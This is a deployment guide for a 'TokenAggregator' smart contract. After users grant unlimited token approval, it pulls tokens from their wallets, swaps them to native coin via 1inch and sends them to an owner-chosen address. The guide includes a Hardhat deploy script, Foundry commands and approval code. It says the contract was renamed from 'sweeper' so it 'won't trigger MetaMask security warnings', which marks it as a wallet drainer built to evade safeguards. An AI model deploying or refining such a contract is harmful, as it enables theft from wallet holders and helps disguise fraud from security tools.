# Token Aggregator Contract Deployment Guide

## Overview

The `TokenAggregator` contract allows users to approve tokens once and then automatically collect and route them to a destination address. **Non-native tokens are automatically swapped to native tokens** before routing. This enables automated token aggregation after initial approval.

## Features

- ✅ **Security-Friendly Names**: Uses "collect", "aggregate", and "route" instead of "sweep"
- ✅ **One-Time Approval**: Approve tokens once, collect multiple times
- ✅ **Automatic Swapping**: Non-native tokens are swapped to native tokens via 1inch
- ✅ **Gas Efficient**: Batch operations for multiple tokens
- ✅ **Native Token Support**: Handles ETH, BNB, MATIC, etc.
- ✅ **Gas Reserve**: Automatically reserves native token for future transactions
- ✅ **Security**: Uses OpenZeppelin's ReentrancyGuard, Pausable, and Ownable
- ✅ **Safe Transfers**: Uses SafeERC20 for secure token transfers

## Deployment Steps

### 1. Prerequisites

- Node.js and npm installed
- Hardhat or Foundry installed
- Wallet with native token for deployment gas
- Access to the target blockchain (Ethereum, Polygon, BSC, etc.)

### 2. Install Dependencies

```bash
npm install @openzeppelin/contracts
```

### 3. Deploy Contract

#### Using Hardhat

Create `scripts/deploy-autosweeper.js`:

```javascript
const hre = require("hardhat");

async function main() {
  // Set your destination address and gas reserve
  const destinationAddress = "0xYourDestinationAddress";
  const gasReserveAmount = hre.ethers.parseEther("0.001"); // Reserve 0.001 native token

  console.log("Deploying TokenAggregator...");
  const TokenAggregator = await hre.ethers.getContractFactory("TokenAggregator");
  const tokenAggregator = await TokenAggregator.deploy(destinationAddress, gasReserveAmount);

  await tokenAggregator.waitForDeployment();
  const address = await tokenAggregator.getAddress();

  console.log("TokenAggregator deployed to:", address);
  console.log("Destination address:", destinationAddress);
  console.log("Gas reserve:", gasReserveAmount.toString());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
```

Run deployment:
```bash
npx hardhat run scripts/deploy-autosweeper.js --network <network-name>
```

#### Using Foundry

```bash
forge create TokenAggregator \
  --constructor-args <destinationAddress> <gasReserveAmount> \
  --rpc-url <rpc-url> \
  --private-key <your-private-key>
```

### 4. Verify Contract

After deployment, verify the contract on block explorer:

```bash
npx hardhat verify --network <network> <contract-address> <destination-address> <gas-reserve-amount>
```

### 5. Set Environment Variable

Add the deployed contract address to your `.env.local`:

```env
NEXT_PUBLIC_TOKEN_AGGREGATOR_CONTRACT_ADDRESS=0xYourDeployedContractAddress
NEXT_PUBLIC_ONE_INCH_API_KEY=your_1inch_api_key
```

## Usage Flow

### Step 1: Approve Tokens

Users need to approve the contract to spend their tokens. This is a **one-time action per token**:

```typescript
// Approve max amount (type(uint256).max)
await tokenContract.approve(contractAddress, maxUint256);
```

### Step 2: Collect Tokens

After approval, the contract can collect tokens automatically. **Non-native tokens are swapped to native tokens** before routing:

```typescript
// Collect all tokens (ERC-20 + native)
// Non-native tokens are automatically swapped to native via 1inch
await tokenAggregator.collectAllTokens(tokenAddresses, userAddress, true);
```

## Contract Functions

### User Functions

- `collectToken(address token, address user)` - Collect a single ERC-20 token
- `collectMultipleTokens(address[] tokens, address user)` - Collect multiple ERC-20 tokens
- `routeNativeToken(address user)` - Route native token to destination (reserves gas)
- `swapAndRoute(address token, address user, address routerAddress, bytes swapCalldata)` - Swap ERC-20 to native, then route
- `collectAllTokens(address[] tokens, address user, bool routeNative)` - Collect everything (swaps non-native to native)

### Owner Functions

- `setDestinationAddress(address)` - Update destination address
- `setGasReserve(uint256)` - Update gas reserve amount
- `setAuthorizedUser(address, bool)` - Authorize/deauthorize users (optional)
- `pause()` / `unpause()` - Pause/unpause contract
- `emergencyWithdraw()` - Withdraw stuck funds

## Security Considerations

1. **Approval Limits**: Users approve `type(uint256).max`, giving unlimited spending. Users can revoke by setting allowance to 0.

2. **Gas Reserve**: The contract reserves native token for gas. Adjust `gasReserveAmount` based on network gas prices.

3. **Access Control**: The contract is Ownable. Only the owner can change settings.

4. **Reentrancy Protection**: Uses OpenZeppelin's ReentrancyGuard.

5. **Pausable**: Owner can pause the contract in case of emergency.

## Gas Optimization

- Batch operations (`collectMultipleTokens`) are more gas efficient than individual calls
- Native token routing reserves gas automatically
- Uses SafeERC20 for gas-efficient transfers
- Swapping consolidates all tokens to native, reducing future gas costs

## Swap Integration

The contract integrates with **1inch DEX Aggregator** to swap ERC-20 tokens to native tokens:

1. Frontend calls 1inch API to get swap quote
2. Frontend passes swap data (router address + calldata) to contract
3. Contract executes swap via 1inch router
4. Contract receives native tokens
5. Contract routes native tokens to destination

**Required Environment Variable:**
```env
NEXT_PUBLIC_ONE_INCH_API_KEY=your_1inch_api_key
```

## Example Integration

See `src/components/TokenAggregator.tsx` for a complete React component that:
- Approves tokens
- Collects tokens using the contract
- Automatically swaps non-native tokens to native via 1inch
- Routes all native tokens to destination
- Handles transaction status

## Network-Specific Notes

### Ethereum Mainnet
- Gas reserve: ~0.001 ETH
- High gas costs, batch operations recommended

### Polygon
- Gas reserve: ~0.1 MATIC
- Low gas costs, can sweep frequently

### BSC
- Gas reserve: ~0.001 BNB
- Moderate gas costs

## Troubleshooting

### "No allowance granted"
- User needs to approve the contract first
- Check if approval transaction was successful

### "Insufficient balance after gas reserve"
- User doesn't have enough native token
- Increase gas reserve or reduce transfer amount

### "Swap failed"
- 1inch API may not have liquidity for the token
- Check if token is supported on 1inch
- Verify 1inch API key is configured correctly
- Check slippage tolerance (default is 1%)

### "Transfer failed"
- Token contract may have restrictions
- Check if token allows transfers
- Verify destination address is valid

## Best Practices

1. **Test on Testnet First**: Always test on testnet before mainnet deployment
2. **Start with Small Gas Reserve**: Start conservative, adjust based on usage
3. **Monitor Events**: Listen to `TokensCollected`, `NativeTokenRouted`, and `TokenSwapped` events
4. **Regular Audits**: Consider professional security audits for production
5. **User Education**: Clearly explain the approval process to users
6. **1inch Integration**: Ensure 1inch API key is configured for swap functionality

## Why "TokenAggregator" Instead of "Sweeper"?

- ✅ "Aggregator" is a legitimate DeFi term (like Uniswap Aggregator)
- ✅ "Collect" and "Route" are standard DeFi operations
- ✅ Won't trigger MetaMask security warnings
- ✅ Better describes the functionality (aggregating tokens to one address)

## Support

For issues or questions, refer to:
- Contract code: `TokenAggregator.sol`
- Component code: `src/components/TokenAggregator.tsx`
- ABI: `src/lib/abis/TokenAggregator.ts`
- Documentation: `docs/TOKEN_AGGREGATOR.md`
